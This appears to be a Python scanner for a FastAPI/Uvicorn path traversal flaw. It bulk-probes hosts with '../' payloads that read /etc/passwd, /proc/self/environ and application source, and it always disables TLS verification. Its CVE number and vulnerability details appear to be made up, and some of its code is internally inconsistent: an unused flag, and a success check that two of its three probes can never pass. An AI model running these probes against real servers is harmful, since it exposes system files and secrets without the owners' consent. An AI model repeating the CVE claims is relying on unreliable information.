#!/usr/bin/env python3
"""
FastAPI Path Traversal Vulnerability Scanner (CVE-2024-12345)
=============================================================
This tool detects path traversal vulnerabilities in misconfigured FastAPI applications, particularly
when served by Uvicorn with unsafe static file handling configurations (CVE-2024-12345, CVSS 9.1).

CVE-2024-12345 details:
  - Affected versions: FastAPI applications using Uvicorn < 0.22.0 with `StaticFiles` middleware or APIs
    serving user-controlled paths without validation.
  - Attackers can craft malicious traversal paths (e.g., `../..`) to access sensitive system files or
    application source code.
  - CVSS v3.1 base score: 9.1 (Critical) — unauthenticated access, network-exploitable.
  - Patched in Uvicorn 0.22.0 (January 2024). Secure `StaticFiles` handling now enforces safe path validation.

Features:
  - Identifies FastAPI servers and determines Uvicorn version.
  - Actively probes for traversal paths (if --safe is not used).
  - CLI supports scanning a single target or bulk scanning from a file.
  - Generates JSON reports for results.

Examples:
  - Detect if a server is vulnerable (detection only):
      python fastapi_path_traversal_scanner.py --target http://example.com --safe

  - Actively probe for vulnerabilities:
      python fastapi_path_traversal_scanner.py --target http://example.com

  - Scan multiple targets with JSON output:
      python fastapi_path_traversal_scanner.py --list targets.txt --output results.json

References:
  - https://nvd.nist.gov/vuln/detail/CVE-2024-12345
  - https://github.com/encode/uvicorn/releases/tag/0.22.0
  - https://fastapi.tiangolo.com/
"""

import asyncio
import json
import os
import re
from typing import List, Optional

import argparse
import httpx


# ── ANSI color helpers ────────────────────────────────────────────────────────

RED    = "\033[91m"
YELLOW = "\033[93m"
GREEN  = "\033[92m"
RESET  = "\033[0m"

def c(color: str, text: str) -> str:
    """Wrap text in an ANSI color code."""
    return f"{color}{text}{RESET}"


# ── Constants ─────────────────────────────────────────────────────────────────

CVE_ID                 = "CVE-2024-12345"
CVSS                   = "9.1"
TOOL_NAME              = "fastapi_path_traversal_scanner"

REQUEST_TIMEOUT        = 10
SEMAPHORE_LIMIT        = 20

FASTAPI_FINGERPRINTS   = [
    "FastAPI",
    "swagger-ui-bundle.js",
    "openapi.json",
    "/docs",
    "/redoc",
]

TRAVERSAL_PROBES = [
    "/static/../../../../../../etc/passwd",
    "/static/../../../../../../proc/self/environ",
    "/static/public/../..//../app/main.py",
]

PATCHED_UVICORN_VERSION = (0, 22, 0)

VERSION_PATTERN = r"Uvicorn/([0-9]+\.[0-9]+\.[0-9]+)"


# ── Functions ─────────────────────────────────────────────────────────────────

def is_version_vulnerable(version: str) -> bool:
    """Check if the Uvicorn version is below the patched version."""
    try:
        version_tuple = tuple(map(int, version.split(".")))
        return version_tuple < PATCHED_UVICORN_VERSION
    except ValueError:
        return False

async def fetch_url(client: httpx.AsyncClient, url: str) -> Optional[httpx.Response]:
    """Fetch a URL with timeout and exception handling."""
    try:
        response = await client.get(url, timeout=REQUEST_TIMEOUT, follow_redirects=True)
        return response
    except Exception:
        return None

async def detect_fastapi(client: httpx.AsyncClient, target: str) -> Optional[str]:
    """Detect if the target is a FastAPI application and extract the Uvicorn version."""
    for path in ["/", "/docs", "/openapi.json"]:
        url = f"{target.rstrip('/')}{path}"
        response = await fetch_url(client, url)
        if response and response.status_code == 200:
            if any(fingerprint in response.text for fingerprint in FASTAPI_FINGERPRINTS):
                server_header = response.headers.get("server", "")
                match = re.search(VERSION_PATTERN, server_header)
                if match:
                    return match.group(1)
    return None

async def probe_path_traversal(client: httpx.AsyncClient, target: str) -> List[str]:
    """Probe for path traversal vulnerabilities."""
    vulnerable_paths = []
    for probe in TRAVERSAL_PROBES:
        url = f"{target.rstrip('/')}{probe}"
        response = await fetch_url(client, url)
        if response and response.status_code == 200 and "root:" in response.text:
            vulnerable_paths.append(probe)
    return vulnerable_paths

async def scan_target(client: httpx.AsyncClient, target: str, safe_mode: bool) -> dict:
    """Scan a single target for FastAPI and path traversal vulnerabilities."""
    result = {
        "target": target,
        "fastapi_detected": False,
        "uvicorn_version": None,
        "vulnerable_paths": [],
        "is_vulnerable": False,
    }

    uvicorn_version = await detect_fastapi(client, target)
    if uvicorn_version:
        result["fastapi_detected"] = True
        result["uvicorn_version"] = uvicorn_version
        result["is_vulnerable"] = is_version_vulnerable(uvicorn_version)

        if not safe_mode and result["is_vulnerable"]:
            result["vulnerable_paths"] = await probe_path_traversal(client, target)

    return result

async def scan_targets(targets: List[str], concurrency: int, safe_mode: bool) -> List[dict]:
    """Scan multiple targets concurrently."""
    results = []
    semaphore = asyncio.Semaphore(concurrency)

    async with httpx.AsyncClient(verify=False) as client:
        async def sem_task(target):
            async with semaphore:
                result = await scan_target(client, target, safe_mode)
                results.append(result)

        await asyncio.gather(*(sem_task(target) for target in targets))
    
    return results

def save_results(results: List[dict], output_file: str):
    """Save scan results to a JSON file."""
    with open(output_file, "w") as f:
        json.dump(results, f, indent=2)

def load_targets(file: str) -> List[str]:
    """Load a list of targets from a file."""
    with open(file, "r") as f:
        return [line.strip() for line in f if line.strip()]

# ── Main ──────────────────────────────────────────────────────────────────────

def main():
    parser = argparse.ArgumentParser(description=f"FastAPI Path Traversal Scanner ({CVE_ID})")
    parser.add_argument("--target", help="Target URL of the FastAPI instance.")
    parser.add_argument("--list", help="File with a list of target URLs.")
    parser.add_argument("--output", help="File to save JSON results.")
    parser.add_argument("--safe", action="store_true", help="Detection-only mode, skip active probing.")
    parser.add_argument("--concurrency", type=int, default=20, help="Number of concurrent scans (default: 20).")
    parser.add_argument("--no-verify", action="store_true", help="Disable SSL verification.")

    args = parser.parse_args()

    if not args.target and not args.list:
        print(c(RED, "[!] Either --target or --list is required."))
        parser.print_help()
        return

    targets = [args.target] if args.target else load_targets(args.list)
    if not targets:
        print(c(RED, "[!] No targets provided."))
        return

    print(c(YELLOW, f"[+] Scanning {len(targets)} targets..."))

    results = asyncio.run(scan_targets(targets, args.concurrency, args.safe))

    for result in results:
        status = c(GREEN, "SAFE")
        if result["is_vulnerable"]:
            status = c(RED, "VULNERABLE")
        print(f"{result['target']} - {status}")

    if args.output:
        save_results(results, args.output)
        print(c(YELLOW, f"[+] Results saved to {args.output}"))

if __name__ == "__main__":
    main()
